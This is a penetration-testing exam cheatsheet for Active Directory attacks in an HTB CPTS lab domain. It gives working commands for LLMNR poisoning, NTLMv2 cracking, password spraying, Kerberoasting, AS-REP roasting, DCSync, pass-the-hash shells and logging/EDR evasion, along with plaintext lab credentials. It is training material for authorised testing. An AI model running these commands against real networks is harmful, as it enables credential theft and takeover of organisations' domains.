# Active Directory Enumeration & Attacks — Exam Cheatsheet

> Fast reference for CPTS exam. Full section guides in numbered .md files.

---

## Lab Credentials

| Host | User | Password | Access |
|------|------|----------|--------|
| MS01 (Windows attack host) | htb-student | `Academy_student_AD!` | RDP |
| ATTACK01 (Parrot Linux) | htb-student | `HTB_@cademy_stdnt!` | SSH or xfreerdp |
| INLANEFREIGHT\backupagent | backupagent | `h1backup55` | Captured via Responder |
| INLANEFREIGHT\wley | wley | `transporter@4` | Captured via Responder |
| INLANEFREIGHT\svc_qualys | svc_qualys | `security#1` | Captured via Inveigh |
| INLANEFREIGHT\sgage | sgage | `Welcome1` | Password spray |
| INLANEFREIGHT\tjohnson | tjohnson | `Welcome1` | Password spray |

```bash
# RDP to Windows attack host
xfreerdp /v:MS01_IP /u:htb-student /p:'Academy_student_AD!' /cert:ignore /dynamic-resolution

# SSH to Parrot attack host
ssh htb-student@ATTACK01_IP

# xfreerdp to Parrot (for BloodHound GUI)
xfreerdp /v:ATTACK01_IP /u:htb-student /p:'HTB_@cademy_stdnt!' /cert:ignore /dynamic-resolution
```

## Tool Locations

| Host | Path |
|------|------|
| Windows (MS01) | `C:\Tools\` |
| Linux (ATTACK01) | `/opt/` or in PATH |

---

## LLMNR/NBT-NS Poisoning

```bash
# Active poisoning — run in tmux, leave it collecting
sudo responder -I ens224 -wf

# Logs
ls /usr/share/responder/logs/

# Crack NTLMv2
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

# Windows equivalent
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y   # PowerShell
.\Inveigh.exe                                            # C#
```

**Windows equivalent (Inveigh):**
```powershell
.\Inveigh.exe                          # C# version (current)
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y   # PowerShell (legacy)
# ESC → interactive console
GET NTLMV2UNIQUE    # hashes for cracking
GET NTLMV2USERNAMES # who you captured
```

**NTLMv2 ≠ NTLM** — must crack before use, cannot pass-the-hash directly.
**No SMB signing → relay instead of crack** (faster foothold, covered in Lateral Movement).

```bash
# Full workflow
sudo responder -I ens224 -wf

# Save hash from Responder output to file
echo "<paste full hash line>" > user.hash

# Crack
hashcat -m 5600 user.hash /usr/share/wordlists/rockyou.txt

# If OpenCL broken on target host
hashcat -m 5600 user.hash /usr/share/wordlists/rockyou.txt --force
```

---

## Initial Internal Enumeration (Unauthenticated)

```bash
# Passive — listen to broadcast traffic
sudo tcpdump -i ens224 -w capture.pcap
sudo responder -I ens224 -A          # analyze only, no poisoning

# Active — host discovery
fping -asgq 172.16.5.0/23           # fast ICMP sweep, outputs live IPs
sudo nmap -v -A -iL hosts.txt -oA host-enum

# DC fingerprint: ports 53 + 88 + 389 + 445 together = Domain Controller

# User enumeration via Kerberos (stealthy — often no logs)
kerbrute userenum -d DOMAIN --dc DC_IP userlist.txt -o valid_users.txt
```

---

## Credentialed Enumeration (Windows)

```powershell
# AD PowerShell Module (built-in, stealthy)
Import-Module ActiveDirectory
Get-ADDomain
Get-ADTrust -Filter *
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
Get-ADGroupMember -Identity "Backup Operators"

# PowerView
Import-Module .\PowerView.ps1
Get-DomainGroupMember -Identity "Domain Admins" -Recurse   # nested DAs
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
Test-AdminAccess -ComputerName TARGET
Find-DomainUserLocation
Find-InterestingDomainAcl

# SharpView (use when PS constrained)
.\SharpView.exe Get-DomainUser -Identity USER

# Snaffler (share pillaging)
.\Snaffler.exe -s -d DOMAIN -o snaffler.log -v data

# SharpHound (BloodHound Windows collector)
.\SharpHound.exe -c All --zipfilename OUTPUT
```

**BloodHound key queries:** Shortest Paths to DA | Unsupported OS | Domain Users as Local Admin | DCSync Rights

---

## Credentialed Enumeration (Linux)

```bash
# CME — users, groups, sessions, shares
crackmapexec smb DC_IP -u USER -p PASS --users
crackmapexec smb DC_IP -u USER -p PASS --groups
crackmapexec smb HOST_IP -u USER -p PASS --loggedon-users   # Pwn3d! = local admin
crackmapexec smb DC_IP -u USER -p PASS --shares
crackmapexec smb DC_IP -u USER -p PASS -M spider_plus --share 'SHARE'

# SMBMap
smbmap -u USER -p PASS -d DOMAIN -H DC_IP
smbmap -u USER -p PASS -d DOMAIN -H DC_IP -R 'SHARE' --dir-only

# rpcclient
rpcclient -U "USER%PASS" DC_IP  →  enumdomusers / queryuser 0xRID

# Impacket shells
psexec.py DOMAIN/USER:'PASS'@HOST      # SYSTEM shell (noisy)
wmiexec.py DOMAIN/USER:'PASS'@HOST     # user-context shell (stealthier)

# Windapsearch
python3 windapsearch.py --dc-ip DC_IP -u USER@DOMAIN -p PASS --da   # domain admins
python3 windapsearch.py --dc-ip DC_IP -u USER@DOMAIN -p PASS -PU    # all privileged (recursive)

# BloodHound
sudo bloodhound-python -u USER -p PASS -ns DC_IP -d DOMAIN -c all
zip -r bh.zip *.json  →  upload to BloodHound GUI
```

---

## Security Controls Enumeration (post-foothold)

```powershell
# Defender
Get-MpComputerStatus | select RealTimeProtectionEnabled

# AppLocker
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

# PowerShell language mode
$ExecutionContext.SessionState.LanguageMode   # FullLanguage or ConstrainedLanguage

# LAPS
Find-LAPSDelegatedGroups        # who can read LAPS passwords per OU
Find-AdmPwdExtendedRights       # accounts with All Extended Rights (can read LAPS)
Get-LAPSComputers               # cleartext passwords if you have access
```

**Constrained Language Mode → use C# tools (SharpView, SharpHound) instead of PS**
**AppLocker blocks PS → try SysWOW64 path or PowerShell_ISE.exe**

---

## Password Spraying (Windows)

```powershell
# DomainPasswordSpray — auto-builds list, respects lockout policy
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue

# With manual user list (if not domain-joined)
Invoke-DomainPasswordSpray -UserList valid_users.txt -Password Welcome1 -OutFile spray_success
```

**Detection:** Event ID 4625 (SMB spray) | Event ID 4771 (Kerberos/LDAP spray)

---

## Password Spraying (Linux)

```bash
# rpcclient one-liner
for u in $(cat valid_users.txt); do rpcclient -U "$u%Welcome1" -c "getusername;quit" DC_IP | grep Authority; done

# Kerbrute
kerbrute passwordspray -d DOMAIN --dc DC_IP valid_users.txt Welcome1

# CrackMapExec (preferred — pipe grep + for hits only)
crackmapexec smb DC_IP -u valid_users.txt -p Password123 | grep +

# Validate a hit
crackmapexec smb DC_IP -u USER -p PASS

# Local admin hash spray across subnet (--local-auth prevents domain lockout)
crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H NTLM_HASH | grep +
# Pwn3d! = local admin access
```

---

## Building a User List for Spraying

```bash
# SMB NULL session (no creds)
enum4linux -U DC_IP | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
rpcclient -U "" -N DC_IP  →  enumdomusers
crackmapexec smb DC_IP --users

# LDAP anon bind (no creds)
ldapsearch -h DC_IP -x -b "DC=domain,DC=local" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
./windapsearch.py --dc-ip DC_IP -u "" -U

# Kerbrute (no creds, stealthy — no 4625 events)
# Also auto-dumps AS-REP hashes for accounts with no pre-auth required
kerbrute userenum -d DOMAIN --dc DC_IP /opt/jsmith.txt
# Lab result: 56 valid users from jsmith.txt against INLANEFREIGHT.LOCAL
# mmorgan = AS-REP roastable (hash dumped automatically → crack with -m 18200)

# Credentialed (best — shows badpwdcount)
crackmapexec smb DC_IP -u USER -p PASS --users
```

**Check badpwdcount before spraying — skip accounts at 3+ if lockout threshold is 5.**

---

## Password Policy Enumeration

```bash
# Credentialed (Linux)
nxc smb DC_IP -u USER -p PASS --pass-pol

# SMB NULL session (unauthenticated)
rpcclient -U "" -N DC_IP        # then: getdompwinfo
enum4linux -P DC_IP
enum4linux-ng -P DC_IP -oA output

# LDAP anonymous bind (unauthenticated)
ldapsearch -H ldap://DC_IP -x -b "DC=domain,DC=local" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts
Get-DomainPolicy    # PowerView
```

**Key values:** lockout threshold (safe attempts) + lockout duration (wait time) + auto-unlock (yes/no)
**Rule:** threshold=5 → try max 3 passwords → wait 31 min → repeat

---

## External Recon Quick Reference

```bash
# DNS validation
nslookup ns1.target.com
dig any target.com @8.8.8.8

# Google dorks
filetype:pdf inurl:target.com
intext:"@target.com" inurl:target.com

# LinkedIn username scraping
python3 linkedin2username.py -u EMAIL -p PASS -c "Company Name"

# GitHub secret hunting
trufflehog github --org=TargetOrg

# Breach data
sudo python3 dehashed.py -q target.local -p
```

**ASN lookup:** bgp.he.net → **IP validation:** viewdns.info → **Nameservers:** nslookup

**Key data to extract:** Email naming format (→ username list), software versions (→ CVEs), breach passwords (→ spray against VPN/OWA/Citrix)

---

## Core Attack Paths

### Unauthenticated → Foothold
```bash
# Username enumeration
kerbrute userenum -d DOMAIN --dc DC_IP users.txt

# NULL session enumeration
enum4linux -a TARGET_IP
smbclient -L //TARGET_IP -N
nxc smb TARGET_IP -u '' -p '' --users

# AS-REP roasting (no pre-auth required)
GetNPUsers.py DOMAIN/ -usersfile users.txt -no-pass -dc-ip DC_IP

# Password spraying
kerbrute passwordspray -d DOMAIN --dc DC_IP users.txt 'Password123'
nxc smb DC_IP -u users.txt -p passwords.txt --continue-on-success
```

### Authenticated → Privilege Escalation
```bash
# BloodHound collection
bloodhound-python -u USER -p PASS -d DOMAIN -ns DC_IP -c all

# Kerberoasting
GetUserSPNs.py DOMAIN/USER:PASS -dc-ip DC_IP -request

# DCSync (if DA or replication rights)
secretsdump.py DOMAIN/USER:PASS@DC_IP

# Pass-the-Hash
evil-winrm -i TARGET -u USER -H NTLM_HASH
psexec.py DOMAIN/USER@TARGET -hashes :NTLM_HASH
```

### Key Attack Chains (from real-world scenarios)
1. **SYSTEM on host → Kerberoast → crack hash → write access shares → SCF file → Responder → NetNTLMv2 → DA**
2. **NULL session → user list + policy → password spray → BloodHound → local admin host → active DA session → pass-the-ticket → DA**
3. **Kerbrute enum → LinkedIn usernames → spray → RDP access → spray again → ACL abuse → Shadow Credentials → DCSync**

---

## Living Off the Land (No Tools Available)

```powershell
# Host overview (fewest logs)
systeminfo
qwinsta                   # who else is logged in?

# Network — find pivot targets
arp -a
route print

# Domain overview
echo %logonserver%
wmic ntdomain get Caption,DnsForestName,DomainName,DomainControllerAddress

# Domain enumeration (net commands — use net1 to evade EDR string detection)
net group "Domain Admins" /domain
net user /domain
net accounts /domain

# PS history — may contain creds
Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt

# Dsquery (native, no drop needed)
dsquery user
dsquery computer
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -attr sAMAccountName  # DCs
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName  # No password required

# PS v2 downgrade (kills Script Block Logging)
powershell.exe -version 2
```

**Key UAC bits:** 32=PASSWD_NOTREQD | 65536=Password Never Expires | 8192=Domain Controller
**OID rules:** `.803`=exact bit match | `.804`=any bit match | `.1941`=DN/membership search

---

## Key Tools Quick Reference

| Tool | Use |
|------|-----|
| `kerbrute` | Username enum, password spray via Kerberos |
| `bloodhound-python` | AD graph collection from Linux |
| `BloodHound` | Visual attack path analysis |
| `Responder` | LLMNR/NBT-NS/MDNS poisoning → NTLMv2 capture |
| `GetUserSPNs.py` | Kerberoasting |
| `GetNPUsers.py` | AS-REP roasting |
| `secretsdump.py` | DCSync, SAM/LSA/NTDS dump |
| `evil-winrm` | WinRM shell with pass-the-hash |
| `nxc` (netexec) | Swiss army knife — SMB/LDAP/WinRM spray & enum |
| `enum4linux` | SMB/LDAP enumeration, NULL sessions |
| `ldapsearch` | Raw LDAP queries |
| `Rubeus` | Kerberos ticket abuse (Windows) |
| `Mimikatz` | Credential extraction (Windows) |
| `PowerView` | AD enumeration from PowerShell |
| `SharpHound` | BloodHound collection from Windows |
